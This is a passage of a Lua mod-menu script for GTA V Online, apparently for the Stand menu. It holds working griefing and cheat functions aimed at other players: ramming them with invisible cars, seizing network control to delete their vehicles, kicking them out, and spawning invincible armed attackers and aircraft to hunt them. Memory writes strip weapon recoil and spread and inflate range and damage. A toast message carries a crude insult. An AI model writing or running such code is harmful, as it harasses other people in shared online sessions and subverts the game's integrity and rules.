        if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
            if set.alert then
                util.toast(pname..  '被粉碎了')
            end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x + 15, tar1.y - 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end
        elseif ENTITY.IS_ENTITY_UPRIGHT(targets, UV) then
        RamCar(vehaset.vehasel, tar1.x - 15, tar1.y + 15, tar1.z, vehaset.invis_aveh, targets, vehaset.vehra)
            if ENTITY.IS_ENTITY_UPRIGHT(targets, UV) ==false then
                if set.alert then
                    util.toast(pname.. ' 被碾过了')
                end


        else
            if set.alert then
                util.toast('无法攻击 ' ..pname)
            end

        end
        end
        end
        end
        end
        end
        end
        end
        end
    end
    if not players.exists(pid) then
        if set.alert then
            util.toast('你让他们怒不可遏')
        end
        util.stop_thread()
    end
end

function vehhitcantsee(on)
    vehaset.invis_aveh = on
end

function deleplayercar(pid)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(player)
    if not PED.IS_PED_IN_ANY_VEHICLE(player, true) then
        util.toast("玩家不在载具里. :/")
        return
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_veh)
    wait(500)
    if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(player_veh) then
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(player_veh, false, false)
        entities.delete_by_handle(player_veh)
    else
        util.toast("无法控制此玩家载具. :/")
    end
end


function give_car_addon(pid, hash, center, ang)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    local pos = ENTITY.GET_ENTITY_COORDS(car, true)
    pos.x = pos['x']
    pos.y = pos['y']
    pos.z = pos['z']
    request_model_load(hash)
    local ramp = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos['x'], pos['y'], pos['z'], true, false, false)
    local size = get_model_size(ENTITY.GET_ENTITY_MODEL(car))
    if center then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, 0.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    else
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ramp, car, 0, 0.0, size['y']+1.0, 0.0, 0.0, 0.0, ang, true, true, true, false, 0, true)
    end
end

function first_to_upper(str)
    return (str:gsub("^%l", string.upper))
end

function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    min = memory.read_vector3(minptr)
    max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])

    memory.free(minptr)
    memory.free(maxptr)

    return size
end

function Changemod(pid, modtype, mod)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spec = GetSpec(pid)
    if not players.exists(pid) then
        util.stop_thread()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(pedm) ==true then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
        GetControl(vmod, spec, pid)
        VEHICLE.GET_NUM_MOD_KITS(vmod)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, modtype, mod, false)
    end
end

function changemodel(pid)
give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)
end

function tpcartomv1(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        wait(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                util.toast("OK")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end

function tpcartomv2(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tpcartomv1(pid, coord)
    end
end




function kick_from_veh(pid)
    log("Kicking " .. pid .. " from vehicle.")
    menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(pid))
end

function npc_jack(target, nearest)
    npc_jackthr = util.create_thread(function(thr)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        kick_from_veh(target)
        local st = os.time()
        while not VEHICLE.IS_VEHICLE_SEAT_FREE(last_veh, -1) do
            if os.time() - st >= 10 then
                util.toast("未能在10秒内释放汽车座椅")
                util.stop_thread()
            end
            wait()
        end
        local hash = 0x9C9EFFD8
        request_model_load(hash)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, -2.0, 0.0, 0.0)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        PED.SET_PED_INTO_VEHICLE(ped, last_veh, -1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(last_veh, true, true, false)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped, last_veh, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 786996, 5, 0)
        util.toast("Vehicle jack complete!")
        util.stop_thread()
    end)
end

function is_ped_player(ped)
    if PED.GET_PED_TYPE(ped) >= 4 then
        return false
    else
        return true
    end
end


vehicle_uses = 0
ped_uses = 0
pickup_uses = 0
player_uses = 0
object_uses = 0
robustmode = false

function mod_uses(type, incr)
    if incr < 0 and is_loading then
        --util.log("不增加使用类型的 var " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    --util.log("递增使用 var 类型 " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

local givegun = false
num_attackers = 1
function send_attacker(hash, pid, givegun)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(hash)
    for i=1, num_attackers do
        local attacker = entities.create_ped(28, hash, coords, math.random(0, 270))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(attacker, true)
        end
        TASK.TASK_COMBAT_PED(attacker, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(attacker, 100.0)
        PED.SET_PED_COMBAT_ABILITY(attacker, 2)
        PED.SET_PED_AS_ENEMY(attacker, true)
        PED.SET_PED_FLEE_ATTRIBUTES(attacker, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
        if givegun then
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atkgun, 0, false, true)
        end
    end
end

function dispatch_griefer_jesus(target)
    log("Dispatched griefer jesus.")
    griefer_jesus = util.create_thread(function(thr)
        util.toast("Griefer jesus sent!")
        request_model_load(-835930287)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local jesus = entities.create_ped(1, -835930287, coords, 90.0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus, true)
        PED.SET_PED_HEARING_RANGE(jesus, 9999)
	    PED.SET_PED_CONFIG_FLAG(jesus, 281, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 5, true)
	    PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 46, true)
        PED.SET_PED_CAN_RAGDOLL(jesus, false)
        WEAPON.GIVE_WEAPON_TO_PED(jesus, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
        TASK.TASK_GO_TO_ENTITY(jesus, target_ped, -1, -1, 100.0, 0.0, 0)
    	TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(jesus, 100.0)
        PED.SET_PED_COMBAT_ABILITY(jesus, 2)
        while true do
            local player_coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
            local jesus_coords = ENTITY.GET_ENTITY_COORDS(jesus, false)
            local dist =  MISC.GET_DISTANCE_BETWEEN_COORDS(player_coords['x'], player_coords['y'], player_coords['z'], jesus_coords['x'], jesus_coords['y'], jesus_coords['z'], false)
            if dist > 100 then
                local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, -3.0, 0.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(jesus, behind['x'], behind['y'], behind['z'], false, false, false, false)
            end
            if not ENTITY.DOES_ENTITY_EXIST(jesus) then
                util.toast("Jesus apparently stopped existing. Stopping Jesus thread.")
                util.stop_thread()
            end
            local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            if not players.exists(target) then
                util.toast("The player target has been lost. The griefer Jesus thread is stopping.")
                util.stop_thread()
            else
                TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
            end
            wait()
        end
    end)
end

function send_aircraft_attacker(vhash, phash, pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    request_model_load(vhash)
    request_model_load(phash)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local aircraft = entities.create_vehicle(vhash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(aircraft, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(aircraft, true)
        end
        for i= -1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local ped = entities.create_ped(28, phash, coords, 30.0)
            if i == -1 then
                TASK.TASK_PLANE_MISSION(ped, aircraft, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
            end
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            PED.SET_PED_INTO_VEHICLE(ped, aircraft, i)
            TASK.TASK_COMBAT_PED(ped, target_ped, 0, 16)
            PED.SET_PED_ACCURACY(ped, 100.0)
            PED.SET_PED_COMBAT_ABILITY(ped, 2)
        end
    end
end

function max_out_car(veh)
    for i=0, 49 do
        num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        VEHICLE.SET_VEHICLE_MOD(veh, i, num -1, true)
    end
end

function send_groundv_attacker(vhash, phash, pid, givegun)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(vhash)
    local bike_hash = -159126838
    request_model_load(phash)
    for i=1, num_attackers do
        local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, num_attackers-i, -10.0, 0.0)
        spawn_pos.x = spawn_pos['x']
        spawn_pos.y = spawn_pos['y']
        spawn_pos.z = spawn_pos['z']
        local bike = entities.create_vehicle(vhash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
        for i=-1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
            local rider = entities.create_ped(1, phash, spawn_pos, 0.0)
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(rider, target_ped)
            end
            max_out_car(atkbike)
            PED.SET_PED_INTO_VEHICLE(rider, bike, i)
            WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 1000, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(rider, 46, true)
            TASK.TASK_COMBAT_PED(rider, player_ped, 0, 16)
            if godmodeatk then
                ENTITY.SET_ENTITY_INVINCIBLE(bike, true)
                ENTITY.SET_ENTITY_INVINCIBLE(rider, true)
            end
            if givegun then
                WEAPON.GIVE_WEAPON_TO_PED(rider, atkgun, 0, false, true)
            end
        end
    end
end

good_guns = {453432689, 171789620, 487013001, -1716189206, 1119849093}


local function getWeaponHash(ped)
    local wpn_ptr = memory.alloc_int()
    if WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(ped, wpn_ptr) then -- only returns true if the weapon is a vehicle weapon
        return memory.read_int(wpn_ptr), true
    end
    return WEAPON.GET_SELECTED_PED_WEAPON(ped), false
end

local function address_from_pointer_chain(address, offsets)
    local addr = address
    for k = 1, (#offsets - 1) do
        addr = memory.read_long(addr + offsets[k])
        if addr == 0 then
            return 0
        end
    end
    addr += offsets[#offsets]
    return addr
end

local function readWeaponAddress(storeTable, offset, stopIfModified)
    if util.is_session_transition_active() then return 0 end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)

    if stopIfModified and storeTable[weaponHash] then return 0 end

    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local address = address_from_pointer_chain(entities.handle_to_pointer(userPed), {0x10B8, pointer, offset})
    if address == 0 then menu.toast('Failed to find memory address.') return 0 end

    if storeTable[weaponHash] == nil then
        storeTable[weaponHash] = {
            address = address,
            original = memory.read_float(address)
        }
    end
    return weaponHash
end

function resetWeapons(modifiedWeapons)
    for hash, _ in pairs(modifiedWeapons) do
        memory.write_float(modifiedWeapons[hash].address, modifiedWeapons[hash].original)
        modifiedWeapons[hash] = nil
    end
end

--武器设置

modifiedRecoil = {}
function gunpro()
    local weaponHash = readWeaponAddress(modifiedRecoil, 0x2F4, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedRecoil[weaponHash].address, 0)
end

modifiedRange = {}
function maxrange()
    if util.is_session_transition_active() then return end
    local userPed = players.user_ped()
    local weaponHash, vehicleWeapon = getWeaponHash(userPed)
    if modifiedRange[weaponHash] then return end
    local pointer = (vehicleWeapon and 0x70 or 0x20)
    local userPedPointer = entities.handle_to_pointer(userPed)
    modifiedRange[weaponHash] = {
        minAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x298}),
        maxAddress   = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x29C}),
        rangeAddress = address_from_pointer_chain(userPedPointer, {0x10B8, pointer, 0x28C}),
    }

    if modifiedRange[weaponHash].minAddress == 0 or modifiedRange[weaponHash].maxAddress == 0 or modifiedRange[weaponHash].rangeAddress == 0 then menu.toast('Failed to find memory address.') return end

    modifiedRange[weaponHash].originalMin   = memory.read_float(modifiedRange[weaponHash].minAddress)
    modifiedRange[weaponHash].originalMax   = memory.read_float(modifiedRange[weaponHash].maxAddress)
    modifiedRange[weaponHash].originalRange = memory.read_float(modifiedRange[weaponHash].rangeAddress)

    memory.write_float(modifiedRange[weaponHash].minAddress,   150000)  --because the map is about 15km tall
    memory.write_float(modifiedRange[weaponHash].maxAddress,   150000)
    memory.write_float(modifiedRange[weaponHash].rangeAddress, 150000)
end

modifiedSpread = {}
function nospread()
    local weaponHash = readWeaponAddress(modifiedSpread, 0x74, true)
    if weaponHash == 0 then return end
    memory.write_float(modifiedSpread[weaponHash].address, 0)
end

modifiedSpinup = {
    [1] = {hash = util.joaat('weapon_minigun')},
    [2] = {hash = util.joaat('weapon_rayminigun')},
}

function nospinup()
    local weaponHash = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
    for i = 1, #modifiedSpinup do
        if weaponHash == modifiedSpinup[i].hash then
            modifiedSpinup[i].address = address_from_pointer_chain(entities.handle_to_pointer(players.user_ped()), {0x10B8, 0x20, 0x144})
            if modifiedSpinup[i].address == 0 then return end
            memory.write_float(modifiedSpinup[i].address, 0)
        end
    end
end

modifiedCarForce = {}
modifiedHeliForce = {}
modifiedPedForce = {}
function damagemoded()
    local weaponHash = readWeaponAddress(modifiedCarForce, 0x0E0, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedCarForce[weaponHash].address, modifiedCarForce[weaponHash].original * 99999999999999)

    weaponHash = readWeaponAddress(modifiedHeliForce, 0x0E4, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedHeliForce[weaponHash].address, modifiedHeliForce[weaponHash].original * 99999999999999)

    weaponHash = readWeaponAddress(modifiedPedForce, 0x0DC, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedPedForce[weaponHash].address, modifiedPedForce[weaponHash].original * 99999999999999)
end

extraZoom2 = 0
modifiedAimFov = {}
---@diagnostic disable-next-line: undefined-global
function gunzoom()
    K.disable_control_action(0, 'INPUT_SNIPER_ZOOM_IN_ONLY')
        K.disable_control_action(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY')

        if not K.is_control_pressed(0, 'INPUT_AIM') then
            extraZoom2 = 0
            return
        end

        local step = if extraZoom2 > 60 or extraZoom2 < -5 then 3 else 6

        if not (extraZoom2 <= -35) and K.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_IN_ONLY') then
            extraZoom2 -= step
        elseif not (extraZoom2 >= 100) and K.is_disabled_control_just_pressed(0, 'INPUT_SNIPER_ZOOM_OUT_ONLY') then
            extraZoom2 += step
        end

        local weaponHash = readWeaponAddress(modifiedAimFov, 0x2FC, false)
        if weaponHash == 0 then return end
        memory.write_float(modifiedAimFov[weaponHash].address, modifiedAimFov[weaponHash].original + extraZoom2)
end

extraZoom = 0
modifiedZoomFov = {}
function enablezoomfov()
    local weaponHash = readWeaponAddress(modifiedZoomFov, 0x410, false)
    if weaponHash == 0 then return end
    memory.write_float(modifiedZoomFov[weaponHash].address,  modifiedZoomFov[weaponHash].original + extraZoom)
end

function zoomaimfov(value)
    extraZoom = (value - 100) / 100
    modifiedZoomWeapon = nil
end


local STOREDIR = filesystem.scripts_dir() .. "/lib/" .. '/GTSCRIPTS/' .. '/GTW/'
local LIBDIR = filesystem.scripts_dir() .. "lib\\GTSCRIPTS\\"
do_autoload = false
local wpcmpTable = {}
local weapons_table = {}
if filesystem.exists(LIBDIR .. "R.lua") then
    wpcmpTable = require("lib.GTSCRIPTS.R")
    weapons_table = util.get_weapons()
else
    util.toast("您没有正确安装资源。\n确保组件资源lua在 " .. LIBDIR .. " directory")
    util.stop_script()
end
local attachments_dict = wpcmpTable[1]
local liveries_dict = wpcmpTable[2]

function Save_Weapon_Profile()
    local charS,charE = "   ","\n"
    local player = players.user_ped()
    file = io.open(STOREDIR .. "loadout.lua", "wb")
    file:write("return {" .. charE)
    local num_weapons = 0
    for _, weapon in weapons_table do
        local weapon_hash = weapon.hash

        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON(player, weapon_hash, false) then
            num_weapons = num_weapons + 1
            if num_weapons > 1 then
                file:write("," .. charE)
            end
            file:write(charS .. "[" .. weapon_hash .. "] = ")
            --WEAPON.SET_CURRENT_PED_WEAPON(player, weapon_hash, true)
            local num_attachments = 0
            for attachment_hash, _ in attachments_dict do
                if (WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, attachment_hash)) then
                    --wait(10)
                    if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, attachment_hash) then
                        num_attachments = num_attachments + 1
                        if num_attachments == 1 then
                            file:write("{")
                            file:write(charE .. charS .. charS .. "[\"attachments\"] = {")
                        else
                            file:write(",")
                        end
                        file:write(charE .. charS .. charS .. charS .. "[" .. num_attachments .. "] = " .. attachment_hash)
                    end
                end
            end
            local cur_tint = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)
            if num_attachments > 0 then
                file:write(charE .. charS .. charS .. "},")
            else
                file:write("{")
            end
            file:write(charE .. charS .. charS .. "[\"tint\"] = " .. cur_tint)
            --- Livery
            for livery_hash, _ in liveries_dict do
                if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, livery_hash) then
                    local colour = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery_hash)
                    file:write("," .. charE .. charS .. charS .. "[\"livery\"] = {")
                    file:write(charE .. charS .. charS .. charS .. "[\"hash\"] = " .. livery_hash .. ",")
                    file:write(charE .. charS .. charS .. charS .. "[\"colour\"] = " .. colour)
                    file:write(charE .. charS .. charS .. "}")
                    break
                end
            end
            file:write(charE .. charS .. "}")
        end
    end
    file:write(charE .. "}")
    file:close()
    util.toast("保存完成了！")
end

function Load_Out_Weapon()
    if filesystem.exists(STOREDIR .. "loadout.lua") then
        player = players.user_ped()
        WEAPON_SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(player, false)
        WEAPON_SAVE_WEAPON.SET_CAN_PED_SELECT_ALL_WEAPONS(player, true)
        local loadout = require("/lib/" .. '/GTSCRIPTS/' .. '/GTW/' .. "loadout")
        for w_hash, attach_dict in loadout do
            WEAPON_SAVE_WEAPON.GIVE_WEAPON_TO_PED(player, w_hash, 10, false, true)
            if attach_dict.attachments ~= nil then
                for _, hash in attach_dict.attachments do
                    WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, hash)
                end
            end
            WEAPON_SAVE_WEAPON.SET_PED_WEAPON_TINT_INDEX(player, w_hash, attach_dict["tint"])
            if attach_dict.livery ~= nil then
                WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(player, w_hash, attach_dict.livery.hash)
                WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, w_hash, attach_dict.livery.hash, attach_dict.livery.colour)
            end
        end
        regen_menu()
        util.toast("配备装备")
        menu.trigger_commands("fillammo")
    else
        util.toast("你以前从未保存过，为什么要点这个选项 操你妈的 *.*")
    end
    package.loaded["store\\loadout"] = nil
end

function Auto_Load_Out_Weapon(on)
    do_autoload = on
end

function Dele_All_Weapon()
    WEAPON_SAVE_WEAPON.REMOVE_ALL_PED_WEAPONS(players.user_ped(), false)
    regen_menu()
    util.toast("你的武器被人用了！")
end

function regen_menu()
    for _, weapon in weapons_table do
        if weapons_action[weapon.hash] ~= nil then
            if weapons_action[weapon.hash]:isValid() then
                weapons_action[weapon.hash]:delete()
            end
        end
    end
    weapons_action = {}
    attachments_action = {}
    weapon_deletes = {}
    cosmetics_list = {}
    tints_slider = {}
    livery_action_divider = {}
    livery_actions = {}
    livery_colour_slider = {}
    livery = {}

    for _, weapon in weapons_table do
        local category = weapon.category
        local weapon_name = util.get_label_text(weapon.label_key)
        local weapon_hash = weapon.hash
        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON(players.user_ped(), weapon_hash, false) then
            generate_for_new_weapon(category, weapon_name, weapon_hash, false)
        else
            weapons_action[weapon_hash] = categories[category]:action(weapon_name .. " (未配备)", {}, "配备 " .. weapon_name,
                    function()
                        weapons_action[weapon_hash]:delete()
                        equip_weapon(category, weapon_name, weapon_hash)
                    end
            )
        end
        WEAPON_SAVE_WEAPON.ADD_AMMO_TO_PED(players.user_ped(), weapon_hash, 10) --- if a special ammo type has been equipped.. it should get some ammo
    end
end

function equip_comp(category, weapon_name, weapon_hash, attachment_hash)
    WEAPON_SAVE_WEAPON.GIVE_WEAPON_COMPONENT_TO_PED(players.user_ped(), weapon_hash, attachment_hash)
end

function equip_weapon(category, weapon_name, weapon_hash)
    WEAPON_SAVE_WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), weapon_hash, 10, false, true)
    wait(10)
    weapon_deletes[weapon_name] = nil
    generate_for_new_weapon(category, weapon_name, weapon_hash, true)
end

function generate_for_new_weapon(category, weapon_name, weapon_hash, focus)
    weapons_action[weapon_hash] = categories[category]:list(weapon_name, {}, "编辑的附件 " .. weapon_name,
            function()
                WEAPON_SAVE_WEAPON.SET_CURRENT_PED_WEAPON(players.user_ped(), weapon_hash, true)
                generate_attachments(category, weapon_name, weapon_hash)
            end
    )
    if focus then
        weapons_action[weapon_hash]:trigger()
    end
end

function generate_cosmetics(weapon_hash, weapon_name)
    -- clear old cosmetic stuff
    livery_action_divider = {}
    livery_colour_slider = {}
    livery = {}
    tints_slider = {}
    livery_actions = {}

    if cosmetics_list[weapon_hash] ~= nil then
        if cosmetics_list[weapon_hash]:isValid() then
            cosmetics_list[weapon_hash]:delete()
        end
        regenerated_cosmetics = true
    end
    cosmetics_list[weapon_hash] = weapons_action[weapon_hash]:list("表面", {}, "",
            function()
                local tint_count = WEAPON_SAVE_WEAPON.GET_WEAPON_TINT_COUNT(weapon_hash)
                local cur_tint = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_TINT_INDEX(player, weapon_hash)

                if tints_slider[weapon_hash] == nil then
                    tints_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("色调", {}, "选择适合你的色调 " .. weapon_name, 0, tint_count - 1, cur_tint, 1,
                            function(change)
                                WEAPON_SAVE_WEAPON.SET_PED_WEAPON_TINT_INDEX(player, weapon_hash, change)
                            end
                    )
                end

                --- livery colour
                local has_liveries = false
                for livery_hash, _ in liveries_dict do
                    if WEAPON_SAVE_WEAPON.DOES_WEAPON_TAKE_WEAPON_COMPONENT(weapon_hash, livery_hash) then
                        has_liveries = true
                        break
                    end
                end


                if has_liveries then
                    --- get current camo component
                    for hash, _ in liveries_dict do
                        if WEAPON_SAVE_WEAPON.HAS_PED_GOT_WEAPON_COMPONENT(player, weapon_hash, hash) then
                            livery[weapon_hash] = hash
                            break
                        end
                    end
                    --- livery colour slider
                    if livery_colour_slider[weapon_hash] == nil then
                        local cur_ctint_colour = WEAPON_SAVE_WEAPON.GET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash])
                        if cur_ctint_colour == -1 then cur_ctint_colour = 0 end
                        livery_colour_slider[weapon_hash] = cosmetics_list[weapon_hash]:slider("皮肤颜色", {}, "改变你的皮肤颜色", 0, 31, cur_ctint_colour, 1,
                                function(index)
                                    if livery[weapon_hash] == nil then
                                        util.toast("你的武器上没有皮肤")
                                    else
                                        WEAPON_SAVE_WEAPON.SET_PED_WEAPON_COMPONENT_TINT_INDEX(player, weapon_hash, livery[weapon_hash], index)
                                    end
                                end
                        )
                    end

                    if livery_action_divider[weapon_hash] == nil then
                        livery_action_divider[weapon_hash] = cosmetics_list[weapon_hash]:divider("皮肤")
